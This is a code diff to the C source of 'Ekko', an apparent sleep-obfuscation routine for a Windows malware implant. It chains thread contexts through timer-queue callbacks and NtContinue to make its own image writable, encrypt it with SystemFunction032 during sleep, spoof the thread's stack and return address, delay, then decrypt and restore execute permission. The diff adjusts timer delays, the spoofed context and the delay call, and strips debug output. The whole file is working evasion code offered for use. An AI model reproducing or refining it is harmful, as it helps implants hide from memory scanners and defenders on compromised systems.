@@ -5,6 +5,13 @@
 #include <Sleep.h>
 #include <Utils.h>
 
+
+/*
+SEC( text, C ) void NTAPI NtGetContextThreadCallback ( PCONTEXT Ctx, BOOLEAN TimerOrWaitFired )
+{
+    ( (PINSTANCE)( ((SIZE_T)Start ) + (int)(PBYTE)(&InstancePlaceholder) ))->Win32.RtlCaptureContext( Ctx );
+} 
+*/
 SEC( text, C ) VOID Ekko ( DWORD SleepTime)
 
 {
@@ -16,7 +23,7 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
     CONTEXT RopProtRW   = { 0 };
     CONTEXT RopMemEnc   = { 0 };
     CONTEXT RopBackup   = { 0 };
-    CONTEXT RopWrite    = { 0 };
+    CONTEXT RopAlert    = { 0 };
     CONTEXT RopSpoof    = { 0 };
     CONTEXT RopFix      = { 0 };
     CONTEXT RopDelay    = { 0 };
@@ -66,12 +73,11 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
     Img.Buffer  = ImageBase;
     Img.Length  = Img.MaximumLength = ImageSize;
     
-    // https://doxygen.reactos.org/df/d53/dll_2win32_2kernel32_2client_2timerqueue_8c.html#a1a76d5f2b6b93fd0dbfe0571cd03effd
-    if ( Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.RtlCaptureContext, &CtxThread, 100, 0, WT_EXECUTEINTIMERTHREAD ) == 0  &&
-         Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtSetEvent, EventTimer, 200, 0, WT_EXECUTEINTIMERTHREAD ) == 0)
+    //CtxThread.ContextFlags = CONTEXT_FULL;
+    // https://doxygen.reactos.org/df/d53/dll_2win32_2kernel32_2client_2timerqueue_8c.html#a1a76d5f2b6b9
+    if (Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.RtlCaptureContext, &CtxThread, 100, 0, WT_EXECUTEINTIMERTHREAD ) == 0  &&
+        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtSetEvent,        EventTimer, 200, 0, WT_EXECUTEINTIMERTHREAD ) == 0)
     { 
-
-        Instance->Win32.printf( "[INFO] Ekko is at 0x%llx\n", Ekko );
         LARGE_INTEGER li = { 0 };
         li.QuadPart    = (long)-1000000L * ( (long)2 ); //-10000000L = 1 second
         //Instance->Win32.printf("[Info] Waiting up to .2 second for timer to trigger\n");
@@ -82,7 +88,7 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
         CopyMemoryEx( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
         CopyMemoryEx( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
         CopyMemoryEx( &RopBackup, &CtxThread, sizeof( CONTEXT ) );
-        CopyMemoryEx( &RopWrite,  &CtxThread, sizeof( CONTEXT ) );
+        CopyMemoryEx( &RopAlert,  &CtxThread, sizeof( CONTEXT ) );
         CopyMemoryEx( &RopSpoof,  &CtxThread, sizeof( CONTEXT ) );
         CopyMemoryEx( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
         CopyMemoryEx( &RopFix,    &CtxThread, sizeof( CONTEXT ) );
@@ -111,7 +117,7 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
 
     
         StubSize = (SIZE_T)GetRIPE - (SIZE_T)ProtStub;                       // Alloc likes to fuck with this so let's set it back to its true value
-        // PVOID ProtStubActualAddress =  (SIZE_T)ProtStub; I have 0 clue why this wouldn't work here.
+        // PVOID ProtStubActualAddress =  (SIZE_T)ProtStub;         I have 0 clue why this wouldn't work here.
         PVOID ProtStubActualAddress =  (SIZE_T)1 + (SIZE_T)ProtStub;
         ProtStubActualAddress = (PBYTE)(ProtStubActualAddress) - 1;
         CopyMemoryEx( CopiedProtStub, ProtStubActualAddress, StubSize);
@@ -160,7 +166,9 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
         // Our spoofed stack will be pointed to NtTib StackBase and the RIP will be the one from the context backed up during ROP
         HANDLE hDupThandle;
         status = Instance->Win32.NtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDupThandle, THREAD_ALL_ACCESS, 0, 0 );
-        CopyMemoryEx( &SpoofContext, &CtxThread, sizeof( CONTEXT ) );
+        //CopyMemoryEx( &SpoofContext, &CtxThread, sizeof( CONTEXT ) );
+        SpoofContext.Rip = Instance->Win32.NtWaitForSingleObject; 
+        SpoofContext.Rsp = NtCurrentTeb()->NtTib.StackBase;
 
         // Back up the current context (mid sleep)
         // NtGetContextThread( ThreadHandle, &Context );
@@ -182,10 +190,9 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
         // NtWaitForSingleObject( hTargetHdl, BOOL alertable, PLARGE_INTEGER SleepTime );
         li.QuadPart    = (long)-10000000L * ((long)SleepTime / 1000 ); // -10000000L = 1 second, and our sleeptime is in milliseconds
         RopDelay.Rsp   -= 8;
-        RopDelay.Rip    = Instance->Win32.NtWaitForSingleObject;
-        RopDelay.Rcx    = NtCurrentProcess();
-        RopDelay.Rdx    = 0;
-        RopDelay.R8     = &li;
+        RopDelay.Rip    = Instance->Win32.NtDelayExecution;
+        RopDelay.Rcx    = FALSE;
+        RopDelay.Rdx     = &li;
 
         // SystemFunction032( &Key, &Img );
         RopMemDec.Rsp  -= 8;
@@ -218,21 +225,19 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
         
         Instance->Win32.printf( "[INFO] Queue timers\n" );
         
-        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopStart, 300, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopProtRW, 400, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopMemEnc, 500, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopBackup,  600, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopSpoof,  700, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopDelay,  800, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopFix,  900, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopMemDec, 1000, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopProtRX, 1100, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopSetEvt, 1200, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopStart, 100, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopProtRW, 200, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopMemEnc, 300, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopBackup, 400, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopSpoof,  500, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopDelay,  600, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopFix,  700, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopMemDec, 800, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopProtRX, 900, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance->Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance->Win32.NtContinue, &RopSetEvt, 1000, 0, WT_EXECUTEINTIMERTHREAD );
 
-        Instance->Win32.printf( "[INFO] Context structs are %d bytes long\n", sizeof(CONTEXT) );
-        Instance->Win32.printf( "[INFO] BackupContext is at 0x%llx\n", &BackupContext );
-        Instance->Win32.printf( "[INFO] SpoofContext is at 0x%llx\n", &SpoofContext );
         Instance->Win32.printf( "[INFO] Wait for EventEnd\n" );
+        
         Instance->Win32.NtSignalAndWaitForSingleObject( EventStart, EventEnd, 0, NULL );
 
         Instance->Win32.printf( "[INFO] Finished waiting for event\n" );
